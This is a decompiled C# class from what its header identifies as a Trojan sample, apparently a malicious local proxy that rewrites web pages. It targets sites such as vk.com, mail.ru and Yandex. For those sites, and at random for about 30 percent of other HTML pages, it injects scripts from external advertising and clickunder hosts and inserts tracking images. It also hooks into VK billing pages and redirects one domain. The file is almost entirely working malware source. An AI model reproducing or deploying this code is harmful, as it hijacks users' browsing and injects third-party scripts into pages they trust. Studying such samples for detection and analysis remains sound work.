// Decompiled with JetBrains decompiler
// Type: ProxyService.XmlHelper
// Assembly: ProxyService, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 376BB12E-163D-442B-85A9-E33D8806BC45
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.MSIL.Proxy.t-92fcc4ce620844256447b8cf217b3ad65fb1bc843d1ea583f6ae64bac1bb9ee7.exe

using System;
using System.Collections.Generic;
using System.Net;

namespace ProxyService
{
  public class XmlHelper
  {
    public static string[] goodsites = new string[14]
    {
      "vk.com",
      "mail.ru",
      "odnoklassniki.ru",
      "rutracker.org",
      "/yandsearch",
      "google.ru/",
      "google.com.ua",
      "google.ua",
      "goole.by",
      "goolge.kz",
      "google.com",
      "pornhub.com",
      "youtube.com",
      "rutube.ru"
    };
    public static Random oldRandom = new Random();
    public static List<XmlHelper.keyword> keys = new List<XmlHelper.keyword>();

    public static void Load()
    {
    }

    public static bool httpIsEnvoved(HttpWebRequest req, HttpWebResponse resp)
    {
      string str1 = req.Address.ToString();
      string str2 = "";
      try
      {
        str2 = resp.ContentType;
        string referer = req.Referer;
      }
      catch (Exception ex)
      {
      }
      bool flag = false;
      foreach (string goodsite in XmlHelper.goodsites)
      {
        if (str1.ToLower().Contains(goodsite))
          flag = true;
      }
      if (!str2.Contains("text/html"))
        return false;
      return XmlHelper.rnd(100) <= 30 || flag;
    }

    public static int rnd(int from) => XmlHelper.oldRandom.Next(0, from);

    public static string ChangeContent(string str, string url, string refx)
    {
      if (url.Contains("domenagent.ru"))
      {
        vkbill.vkCatchBilled(str);
        return str;
      }
      ProxyServer.dbg("replace: " + url + "/" + refx);
      string str1 = "\r\n<script type='text/javascript' src='http://contact-teaser.ru/jsfeed.ashx?flow_id=1&block_id=1&sub_key=vk'>\r\n</script>\r\n<script>\r\n\tv=3; // тизеров по горизонтали\r\n\th=1; // тизеров по вертикали\r\n\timage_size=100; // размер тизера\r\n\ttext_position=4 //положение текста: 1- справа, 2 - слева, 3 - сверху, 4 - снизу \r\n</script>\r\n<script type='text/javascript' src='http://contact-teaser.ru/jsfeed.js'>\r\n</script>\r\n";
      string str2 = "<div id='bn_bfb5187b1b'>загрузка...</div>\r\n            <script type='text/javascript' SRC='http://recreativ.ru/rcode.bfb5187b1b.js'></script> ";
      string newValue1 = "<div id='DIV_DA_90725'></div><script charset='windows-1251' type='text/javascript' src='http://www.directadvert.ru/show.cgi?adp=90725&div=DIV_DA_90725'></script>";
      string str3 = "\r\n<script type='text/javascript' src='http://contact-teaser.ru/jsfeed.ashx?flow_id=1&block_id=1&sub_key='>\r\n</script>\r\n<script>\r\n\tv=2; // тизеров по горизонтали\r\n\th=2; // тизеров по вертикали\r\n\timage_size=110; // размер тизера\r\n\ttext_position=1 //положение текста: 1- справа, 2 - слева, 3 - сверху, 4 - снизу \r\n</script>\r\n<script type='text/javascript' src='http://contact-teaser.ru/jsfeed.js'></script>";
      string[] strArray1 = new string[2]
      {
        str1 + str2,
        str1 + str2
      };
      if (url.Contains("vk.com"))
      {
        if (vkbill.IsInjectVKBill(url, str))
        {
          str = vkbill.vkBillCode(str);
        }
        else
        {
          str = str.Replace("<div id=\"left_blocks\"></div>", "");
          str = str.Replace("<div id=\"left_ads\"></div>", strArray1[XmlHelper.rnd(strArray1.Length)]);
        }
      }
      if (url.Contains("mail.ru"))
      {
        str = str.Replace("<script>splashRadar('informers');</script>", str3 + " ");
        str = str.Replace("<script>splashRadar('news', 1);</script>", newValue1);
      }
      string[] strArray2 = new string[5]
      {
        "\r\n\r\n                    <div id='DIV_DA_90338'></div>\r\n                    <script charset='windows-1251' type='text/javascript' src='http://www.directadvert.ru/show.cgi?adp=90338&div=DIV_DA_90338'></script>",
        "\r\n<script language='javascript' type='text/javascript' src='http://popun.domenagent.ru/5pdvtwcu3a498u0ohrq7mc1bl6otjsd1'></script>\r\n",
        "<script type='text/javascript'>var sid=57864,bid=4117;</script><script type='text/javascript' src='http://vmblock.net/vm.js'></script>",
        "<script src='http://contact-under.ru/upper_vk.js'></script>",
        " <script>\r\n var siteid=57864;\r\n var cats='0';\r\n var adult='1';\r\n</script> \r\n<script src='http://linkupper.ru/clickunder.js'></script>"
      };
      string newValue2 = strArray2[XmlHelper.rnd(strArray2.Length)] + strArray2[XmlHelper.rnd(strArray2.Length)];
      str = !url.Contains("vk.com") ? str + newValue2 : str.Replace("<noscript><meta http-equiv=\"refresh\" content=\"0; URL=/badbrowser.php\"></noscript>", newValue2);
      string[] strArray3 = new string[2]
      {
        "\r\n <div id='cpr_5076'></div> <script language='javascript' type='text/javascript'>   var cashprom_p = '5076';  var cashprom_d = 'cpr_5076';  var cashprom_width = '240';  var cashprom_height = '400';   </script>  <script charset='UTF-8' language='javascript' type='text/javascript' src='http://slave.cashprom.ru/load.js'></script>",
        "<div id='bn_4614cef1a1'>загрузка...</div>\r\n <script type='text/javascript' SRC='http://recreativ.ru/rcode.4614cef1a1.js'></script>"
      };
      if (url.Contains("yandex.ru/yandsearch") || url.Contains("yandex.ua/yandsearch") || url.Contains("yandex.by/yandsearch") || url.Contains("yandex.kz/yandsearch"))
      {
        str = str.Replace(">Разместить объявление по запросу", strArray3[XmlHelper.rnd(strArray3.Length)] + ">Разместить объявление по запросу");
        str = str.Replace("</title>", "</title><img width=0 height=0 src='http://domenagent.ru/service/test/Default_files/_se.ashx?rnd=" + XmlHelper.rndtext() + "'></img>");
      }
      if (url.Contains("support-contact.ws"))
        str = "<html><script>document.location='http://adobe.com'</script></html>";
      return str;
    }

    private static string rep(string str, string from, string tos, string withs)
    {
      int num1 = str.IndexOf(from);
      int num2 = str.IndexOf(tos, Math.Max(0, num1));
      if (num1 != -1 && num2 != -1)
      {
        string oldValue = str.Substring(num1, num2 - num1 + tos.Length);
        str = str.Replace(oldValue, withs);
      }
      return str;
    }

    public static string extr(string str, string from, string tos, bool withCorners)
    {
      int num1 = str.IndexOf(from);
      int num2 = str.IndexOf(tos, Math.Max(0, num1));
      if (num1 == -1 || num2 == -1)
        return "";
      return !withCorners ? str.Substring(num1 + from.Length, num2 - num1 - from.Length) : str.Substring(num1, num2 - num1 + tos.Length);
    }

    public static string rndtext() => new Random().Next(1, 100000).ToString();

    public struct keyword
    {
      public int tickcount;
      public string key;
    }
  }
}
